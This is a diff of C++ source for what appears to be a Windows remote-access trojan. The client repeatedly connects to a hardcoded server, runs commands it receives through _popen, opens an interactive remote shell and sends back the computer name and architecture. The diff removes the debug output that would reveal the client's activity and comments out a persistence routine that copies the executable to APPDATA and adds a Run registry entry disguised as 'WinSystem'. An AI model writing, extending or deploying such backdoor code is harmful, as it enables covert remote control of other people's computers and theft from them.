@@ -1,4 +1,3 @@
-
 #include <iostream>
 #include <winsock2.h>
 #include <windows.h>
@@ -9,9 +8,6 @@
 
 #include "main.h"
 #include "modules.h"
-
-
-using namespace std;
 
 
 #define BUFSIZE 256
@@ -25,19 +21,19 @@ int main(int argc,char* argv[])
 {
     WSADATA WSAData;
     WSAStartup(MAKEWORD(2,0), &WSAData);
-
+/*
     // Copy executable to appdata
     char* appdata = getenv("APPDATA");
     string copyEx = "copy \""+ string(argv[0]) + "\" " + appdata;
     system(copyEx.c_str());
 
-    // Add registry key
+    // Add registry key for persistence
     std::size_t pos = strlen(argv[0]);
     string argvzero = (string)argv[0];
     std::string name = argvzero.substr(argvzero.find_last_of('\\', pos));
     string path="\""+string(appdata)+name+"\"";
     addRunEntry("WinSystem",path.c_str());
-
+*/
     while(1)
     {
         connect_to_server("192.168.1.27");
@@ -82,7 +78,6 @@ int connect_to_server(const char* addr)
     sock = socket(PF_INET,SOCK_STREAM,0);
     if(sock==-1)
     {
-        std::cout<<"Error while creating socket..."<<std::endl;
         return -1;
     }
 
@@ -93,7 +88,6 @@ int connect_to_server(const char* addr)
 
     if (connect(sock,(const struct sockaddr*)&server,sizeof(server))!= 0)
     {
-        std::cout<<"Error connecting socket..."<<std::endl;
         return -1;
     }
     while(1)
@@ -103,21 +97,16 @@ int connect_to_server(const char* addr)
         {
             str[len-1]='\0';
         }else{
-            std::cerr<<"Error recv socket"<<std::endl;
             return -1;
         }
-        std::cout<<"action recue :'"<<str<<"'"<<std::endl;
         if(strcmp(str,"start shell")==0)
         {
-            std::cout<<"Lets start the shell...!"<<std::endl;
             shell_to_server(sock);
         }else if(strcmp(str,"cmd")==0)
         {
-            printf("lancement de la commande sock\n");
                 command(sock);
         }else if(strcmp(str,"info")==0)
         {
-            printf("Recuperation des info");
             sendInfo(sock);
         }
 
@@ -135,13 +124,10 @@ void command(int fd)
     len = recv(fd,str,sizeof(str),0);
     if(len>0)
     {
-        printf("received :%s\n",str);
         str[len-1]='\0';
     }else{
-        std::cerr<<"Error recv command"<<std::endl;
         return;
     }
-    printf("Exec command: %s\n",str);
     fp = _popen(str,"r");
     if(fp)
     {
@@ -150,12 +136,10 @@ void command(int fd)
             len = send(fd,str,sizeof(str)-1,0);
             if(len == -1)
             {
-                std::cerr<<"Error send command result"<<std::endl;
                 return;
             }
-            if( receipt_confirmation(fd ,RECV)== ERROR)
+            if( receipt_confirmation(fd ,RECV)== -1)
             {
-                std::cerr<<"Error receipt confirmation"<<std::endl;
                 return;
             }
 
@@ -165,7 +149,6 @@ void command(int fd)
     len = send(fd,quit_str,strlen(quit_str),0);
     if(len==-1)
     {
-        std::cerr<<"Error quit str"<<std::endl;
         return;
     }
 
@@ -173,23 +156,28 @@ void command(int fd)
 
 void sendInfo(int fd)
 {
-    std::cout<<"sendinfo():"<<std::endl;
     const char quit_str[] ="quit: result";
-    char str[BUFFERSIZE];
+    char str[BUFFERSIZE] ="";
     ssize_t len;
-    strcat(str,"Computer Name :");
+    strcat(str,"Computer Name: ");
     strcat(str,getComputerName());
+    if(IsWow64())
+    {
+        strcat(str,"\nArchitecture: 64bits");
+    }else{
+        strcat(str,"\nArchitecture: 32bits");
+    }
+
+
     len = send(fd,str,strlen(str),0);
     if(len==-1)
     {
-        std::cerr<<"Error send info"<<std::endl;
         return;
     }
 
     len = send(fd,quit_str,strlen(quit_str),0);
     if(len==-1)
     {
-        std::cerr<<"Error quit str"<<std::endl;
         return;
     }
 }
@@ -206,7 +194,6 @@ void shell_to_server(int fd)
         len = send(fd,prompt,strlen(prompt),0);
         if(len==-1)
         {
-            std::cerr<<"Error send prompt"<<std::endl;
             return;
         }
         len = recv(fd,str,sizeof(str)-1,0);
@@ -214,10 +201,8 @@ void shell_to_server(int fd)
         {
             str[len-1]='\0';
         }else{
-            std::cerr<<"Error recv socket"<<std::endl;
             return;
         }
-        std::cout<<"commande recue : "<<str<<std::endl;
         if(str[0]=='c'&&str[1]=='d')
         {
             chdir(str+3);
@@ -234,11 +219,9 @@ void shell_to_server(int fd)
                     len = send(fd,str,sizeof(str)-1,0);
                     if(len == -1)
                     {
-                        std::cerr<<"Error send command result"<<std::endl;
                     }
-                    if( receipt_confirmation(fd ,RECV)== ERROR)
+                    if( receipt_confirmation(fd ,RECV)== -1)
                     {
-                        std::cerr<<"Error receipt confirmation"<<std::endl;
                         return;
                     }
 
@@ -250,13 +233,11 @@ void shell_to_server(int fd)
         len = send(fd,quit_str,strlen(quit_str),0);
         if(len==-1)
         {
-            std::cerr<<"Error quit str"<<std::endl;
             return;
         }
 
-        if( receipt_confirmation(fd ,RECV)== ERROR)
+        if( receipt_confirmation(fd ,RECV)== -1)
         {
-            std::cerr<<"Error receipt confirmation"<<std::endl;
             return;
         }
     }
@@ -276,11 +257,10 @@ int receipt_confirmation(int sock,int check)
 
             if ( strcmp(str,"OK"))
             {
-                return ERROR;
+                return -1;
             }
         }else{
-            std::cerr<<"Error recv ok"<<std::endl;
-            return ERROR;
+            return -1;
         }
     }else{
         char str[] = "OK";
@@ -288,8 +268,7 @@ int receipt_confirmation(int sock,int check)
         len = send(sock,str,strlen(str),0);
         if ( len == -1 )
         {
-            std::cerr<<"Error send ok"<<std::endl;
-            return ERROR;
+            return -1;
         }
     }
 
